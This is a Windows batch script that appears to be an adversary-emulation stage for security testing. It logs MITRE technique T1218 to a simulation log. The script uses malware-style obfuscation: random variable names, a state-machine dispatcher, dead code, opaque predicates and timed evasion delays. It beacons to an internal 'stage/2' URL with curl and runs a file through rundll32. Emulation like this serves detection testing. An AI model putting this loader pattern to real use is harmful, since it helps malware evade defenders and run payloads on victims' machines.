@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8296\e38ce366
SET fpakbq=Macula-Stage0-8296
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8296-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=firelox.txt
SET fpldhe=8296

REM Additional random variables for script logic
SET zxmqp=%repbmqg%
SET kjhfd=rdlln
SET wqert=%edjwtl%
SET lmnbv=%yktnwwf%
SET qazxsw=%omxgazu%
SET poiuy=%fpldhe%
SET mkjhg=%yydue%
SET logpath=%APPDATA%\%yydue%\macula-simulations.log

REM Initial random delay 30-60s
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: initial_delay_start=30s>> "!logpath!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: initial_delay_complete=success>> "!logpath!" 2>nul

REM State machine setup
SET st=10
GOTO dsptch_qw

REM Dead code block 1
:dead_afghj
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: dead_code_1_triggered=error>> "!logpath!" 2>nul
SET fake=neverused
GOTO END

REM Dispatch state machine
:dsptch_qw
IF !st!==10 GOTO init_xcvb
IF !st!==25 GOTO hbeat_tyui
IF !st!==37 GOTO chdir_dfgh
IF !st!==52 GOTO exec_vbnm
IF !st!==99 GOTO logexit_zxc
GOTO dead_afghj

REM Dead code block 2
:dead_lkjhg
REM Opaque predicate (always false)
IF 0==1 (
    GOTO real_code
) ELSE (
    GOTO dead_end
)
:real_code
EXIT /B 0
:dead_end
GOTO END

REM State 10: Initial setup
:init_xcvb
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: state_initial_setup_start=!st!>> "!logpath!" 2>nul

REM Intermediate random delay 5-15s
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: intermediate_delay_start=10s>> "!logpath!" 2>nul
ping -n 10 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: intermediate_delay_complete=success>> "!logpath!" 2>nul

SET st=25
GOTO dsptch_qw

REM Dead code block 3
:dead_plmko
SET junk1=data1
SET junk2=data2
GOTO dead_plmko2
:dead_plmko2
GOTO END

REM State 25: Heartbeat
:hbeat_tyui
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: heartbeat_start=!rdzgrnne!>> "!logpath!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
SET hbresult=1
IF !ERRORLEVEL! NEQ 0 SET hbresult=0
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: heartbeat_complete=!hbresult!>> "!logpath!" 2>nul

REM Random computed delay
SET /A rndelay=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: random_delay_start=!rndelay!s>> "!logpath!" 2>nul
timeout /t !rndelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: random_delay_complete=success>> "!logpath!" 2>nul

SET st=37
GOTO dsptch_qw

REM Dead code block 4
:dead_qwert
REM Fake conditional
SET fk=5
IF !fk! GTR 10 (
    GOTO fake_branch
)
GOTO dead_qwert2
:fake_branch
EXIT
:dead_qwert2
GOTO END

REM State 37: Change directory
:chdir_dfgh
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: chdir_start=!lmnbv!>> "!logpath!" 2>nul
cd /d "!lmnbv!" 2>nul
SET cdresult=1
IF !ERRORLEVEL! NEQ 0 SET cdresult=0
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: chdir_complete=!cdresult!>> "!logpath!" 2>nul

REM Delay before execution
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: pre_exec_delay_start=8s>> "!logpath!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: pre_exec_delay_complete=success>> "!logpath!" 2>nul

SET st=52
GOTO dsptch_qw

REM Dead code block 5
:dead_mnbvc
FOR /L %%i IN (1,1,5) DO (
    SET tmp%%i=junk
)
GOTO dead_mnbvc2
:dead_mnbvc2
GOTO END

REM State 52: Execute DLL via Rundll32
:exec_vbnm
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: dll_exec_start=!wqert!>> "!logpath!" 2>nul
SET ttp_result=1
SET err_detail=

REM Construct and execute rundll32 command
%SystemRoot%\System32\rundll32.exe "!wqert!", DllMain 2>nul
IF !ERRORLEVEL! NEQ 0 (
    SET ttp_result=0
    SET err_detail=dll_load_failed
)

echo [!DATE! !TIME!][DEBUG][!qazxsw!]: dll_exec_complete=!ttp_result!>> "!logpath!" 2>nul

SET st=99
GOTO dsptch_qw

REM State 99: Log TTP and exit
:logexit_zxc
REM Format timestamp for TTP logging
SET year=!DATE:~-4!
SET month=!DATE:~4,2!
SET day=!DATE:~7,2!
SET tstamp=!year!-!month!-!day! !TIME:~0,8!.000

REM Log T1218 execution
echo [!tstamp!][!qazxsw!]: !mkjhg!-!poiuy!-T1218|Signed_Binary_Proxy_Execution=!ttp_result!:!err_detail!>> "!logpath!" 2>nul
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: ttp_logged=T1218>> "!logpath!" 2>nul

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: final_delay_start=5s>> "!logpath!" 2>nul
timeout /t 5 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!qazxsw!]: final_delay_complete=success>> "!logpath!" 2>nul

:END
ENDLOCAL